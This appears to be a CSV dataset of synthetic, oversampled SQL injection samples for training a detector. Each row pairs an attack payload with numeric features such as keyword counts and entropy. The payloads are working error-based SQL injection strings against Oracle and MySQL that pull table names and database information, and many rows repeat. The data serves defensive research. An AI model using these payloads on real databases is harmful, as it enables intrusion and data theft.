id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000511,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.1828230157176386,334.65443807470433,34.0,3.4774520462837493,80.0,52.0,145.65443807470436,57.0,0.23905528208525637,0.15538593335541664,0.4352318960735818,0.17032688848574518,0.0863904813239127,0.0,1.0,0.0,0.0,2.0,0.0,30.91360951867609,0.0,0.0,1.0,23.0,0.08639048132391292,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000512,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.5647830750990394,216.01309446001932,41.20523778400772,4.281935269057708,118.80785667601158,2.0,71.0,24.20523778400772,0.549996584833704,0.009259891697462247,0.32872615525990934,0.11201736820892452,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,5.205237784007721,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000513,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000021,0.1541210323133556,207.81130510382923,38.84905790801423,3.8389810930716015,63.0,37.0,84.5094209198577,23.301884183971538,0.30328422059452115,0.17811930415868707,0.406488874718822,0.11210760052796974,1.0,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,15.30188418397154,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000514,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000073,0.33266221474941743,280.70329615264825,36.93186815389407,3.9919010079565176,101.86373630778814,43.0,102.63516430654234,33.20439553831779,0.3630947724757448,0.15325832703070325,0.36535769112087146,0.11828920937268053,0.0,0.0,1.8637363077881393,0.0,2.0,2.0,0.0,19.340659230529653,0.0,2.0,5.0,5.863736307788139,0.0,0.0,0.9318681538940696,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.9318681538940696,2.0,1.0681318461059304,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000515,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,0.8038065961065104,230.32531359774887,33.565336369577096,3.9383454541616882,80.2462181738972,43.68088180432011,81.49243634779441,24.90577727173715,0.34881141028433676,0.18916693469893067,0.35365393549793417,0.1083677195187984,2.0942227282628494,0.0,0.0,0.0,0.0,1.9057772717371506,0.0,13.90577727173715,0.0,0.0,4.905777271737151,3.905777271737151,1.0,0.0,0.0,0.09422272826284937,0.0,1.0,1.0,0.0,0.0,1.0,0.0942227282628493,1.9057772717371508,0.0,1.0,0.09422272826284939,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.09422272826284922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9057772717371508,0.9057772717371508,5.905777271737151
SMOTE_000516,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000014,2.7837090733262184,210.48628958777215,34.0,3.841528584206618,62.975625933817156,42.49238310431786,80.51371041222785,24.50457013740928,0.29851508275093397,0.2017154964095415,0.38314494761703105,0.11662447322249349,0.501523379136428,0.4984766208635719,2.0,0.0,0.5015233791364281,2.0,0.0,14.003046758272855,0.0,0.0,4.498476620863572,4.501523379136428,0.5015233791364281,0.4984766208635719,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.003046758272856,0.0,1.0,0.5015233791364282,0.5015233791364281,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4984766208635719,0.4984766208635719,6.003046758272856
SMOTE_000517,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000053,2.3444812656963734,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,2.0756877636692175,1.924312236330782,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.5189219409173045,0.4810780590826955,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000518,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000026,0.8214077222490516,331.765699292881,32.468601414238066,3.4488010161461684,80.76569929288097,49.7029021213571,145.06279717152387,56.23430070711903,0.24344074657402837,0.14981840569777044,0.43723889422510553,0.16950195350309563,0.23430070711903372,0.0,0.23430070711903372,0.0,0.0,2.0,0.0,30.765699292880967,0.0,0.0,1.0,22.234300707119033,0.23430070711903384,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7656992928809663,0.23430070711903378,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000519,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000075,1.7932191537212057,344.43550683997927,34.717753419989634,3.607142514182561,89.38315064992229,48.64112329000518,145.12898632004146,61.282246580010366,0.25939824147306006,0.14123192926721162,0.4214280445926121,0.17794178466711622,0.0,4.0,0.3588767099948186,0.0,0.0,3.0,0.0,29.282246580010366,1.2822465800103628,1.0766301299844556,0.6411232900051815,23.358876709994817,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.6411232900051813,0.3588767099948186,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000520,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,0.42987969016539035,330.1940965792083,33.291144868812474,3.5067655271512406,81.16457947524988,51.61180684158337,141.3206619727709,56.09704828960416,0.24579028386724897,0.15631437783500984,0.42800526411798845,0.16989007417975271,0.0,0.0,1.1940965792083142,0.0,0.0,2.0,0.0,29.805903420791687,0.0,0.2911448688124707,0.9029517103958433,23.194096579208313,0.0,0.0,0.09704828960415701,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000521,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.3334694446922741,234.01009741520437,42.88944985640025,4.396793588980969,132.45229798960338,2.0,73.66834956920073,25.889449856400244,0.5647870633516763,0.008596037801950285,0.31566465523380494,0.11095224361256852,3.0,0.0,0.0,0.0,0.0,3.444724928200121,0.0,10.0,0.0,6.444724928200121,1.0,3.444724928200121,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.4447249282001213,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.444724928200121
SMOTE_000522,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,0.5301727498893247,328.1995642970474,33.2572051004218,3.5189627233340968,82.05764080337441,50.971179598312794,139.42794899578197,55.7427948995782,0.25014594541091817,0.15526889880848818,0.4247385780882571,0.16984657769233655,0.0,0.0,1.0,0.0,0.0,2.0,0.0,29.485589799156397,0.0,0.771615301265405,0.7427948995781981,23.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000523,attack,error,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000021,0.40163997429749604,207.0920069730136,38.81799883783107,3.840862260851889,63.0,37.0,84.0920069730136,23.0,0.3042499441449932,0.1786864751327738,0.4059882042883466,0.11107537643388642,0.8179988378310667,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,15.182001162168934,0.0,0.0,3.0,3.0,0.8179988378310667,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000524,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,2.3647915468901637,226.39462145215214,32.05637449316459,3.8290458930073803,77.0,37.0,86.33824695898755,26.05637449316459,0.3404396525013088,0.16358788496816137,0.3809063117143101,0.11506615081621968,1.8872510136708165,2.1127489863291835,0.0,0.0,0.0,2.0,0.0,15.056374493164592,0.0,0.0,5.0,2.0,0.4718127534177041,0.5281872465822959,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000525,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,1.8963371993695748,218.02905288820605,30.56191320856502,3.696230095240503,64.73356983982052,37.87617358286996,88.1716566312555,27.247652834260073,0.29346476389850257,0.17741570918566701,0.4031772926362777,0.12594223427955267,4.0,0.0,0.0,0.0,0.0,1.5619132085650185,0.0,16.247652834260073,0.0,0.0,5.438086791434982,1.5619132085650183,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.4380867914349813,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5619132085650186,0.5619132085650186,4.561913208565018
SMOTE_000526,attack,error,"1   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   9325  =  9325",nearest_attack_euclidean,R000051,1.6566423308036922,331.154754796073,38.23016346928464,3.9070637311044765,104.4603269385693,63.0,128.69442785750374,35.0,0.315558713588305,0.19025677464480445,0.3884863036308881,0.10569820813600246,0.0,0.307540867321161,0.6150817346423217,0.0,2.0,2.0,0.0,23.077377398036518,0.0,0.0,6.0,5.615081734642322,0.0,0.3075408673211609,0.3075408673211609,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.3075408673211608,1.0,1.692459132678839,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000527,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",nearest_attack_euclidean,R000041,0.5012143374917356,312.32912731834574,37.32912731834573,4.0380346907045865,110.31650927338293,55.0,112.34174536330853,34.67087268165427,0.3531977145858502,0.17609668630182462,0.3596955964444498,0.11101000266787531,4.0,0.0,0.0,0.0,2.0,1.6708726816542674,0.0,20.0,0.0,0.0,6.0,4.670872681654267,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000528,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.891162766924386,228.69960977962626,42.594422765534794,4.378228282566298,128.32191871748708,2.0,72.78326829660438,25.59442276553479,0.5600344055995274,0.008787849101364376,0.318989384423649,0.11218836087545923,3.0,0.0,0.0,0.0,0.0,3.2972113827673954,0.0,10.0,0.0,6.2972113827673954,1.0,3.2972113827673954,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.2972113827673957,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.2972113827673954
SMOTE_000529,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,0.9678402771001355,325.6475123189172,34.0,3.5690966005805493,85.35248768108279,49.323756159458604,135.3093903986465,55.661878079729306,0.262268128636602,0.1514174389288216,0.4153981412238526,0.17091629121072385,0.33093903986465123,0.0,1.0,0.0,0.0,2.0,0.0,28.661878079729306,0.0,2.0071828804060456,0.33093903986465145,23.0,0.33093903986465145,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000530,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,0.12514921789613212,324.91274650833986,31.13088023749018,3.539674077256715,88.95637325416993,45.13088023749018,135.82549301667976,55.0,0.2737850618562799,0.1389041436942988,0.41803431012418857,0.16927648432523273,0.0,0.0,0.04362674583006093,0.0,0.0,2.0,0.0,28.95637325416994,0.0,3.0,0.0,22.043626745830057,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9563732541699391,0.04362674583006093,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000531,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.2589226075953994,230.2877558783652,41.686610329596604,4.308185112929669,130.0712300543737,2.0,73.52991549439491,24.686610329596604,0.5633711242433341,0.00875059125805458,0.3206062868829653,0.10727199761564596,3.0,0.0,0.0,0.0,0.0,3.421652582399151,0.0,10.0,0.0,5.264957747197453,1.0,3.421652582399152,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.421652582399151,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.421652582399151
SMOTE_000532,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,0.5134737984344405,191.83584297622428,32.0,3.6710437897951835,52.99636343496512,34.57298709930066,79.27012900699337,24.99636343496512,0.27677181952867813,0.18145329677187422,0.41167059286826646,0.13010429083118114,0.0,4.0,0.0,0.0,0.14233763356644558,0.9999999999999999,0.0,14.854025801398674,0.0,0.0,4.857662366433554,1.142337633566446,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.2846752671328916,0.0,0.0,0.1423376335664458,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.427012900699337
SMOTE_000533,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,0.8311478603071927,330.39327986590104,33.39327986590103,3.48936329437382,80.0,52.0,142.0,56.39327986590102,0.24213620443768122,0.15738853288449278,0.42979176287688414,0.17068349980094188,0.3932798659010257,0.0,1.0,0.0,0.0,2.0,0.0,30.0,0.0,0.0,1.0,23.0,0.3932798659010258,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000534,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000056,1.7857412433022495,216.85274631408356,30.647032841877806,3.4505808687589283,54.60285673610287,34.70593431624439,98.91164778845013,28.63230747328616,0.2509791463709927,0.16196603698063022,0.45547542845321687,0.13157938819516019,0.0,2.6470328418778064,0.0,0.0,1.0,1.3382417895305483,0.0,18.647032841877806,0.0,0.0,4.0,2.3382417895305485,0.0,0.6617582104694516,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.6617582104694517,0.3382417895305484,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
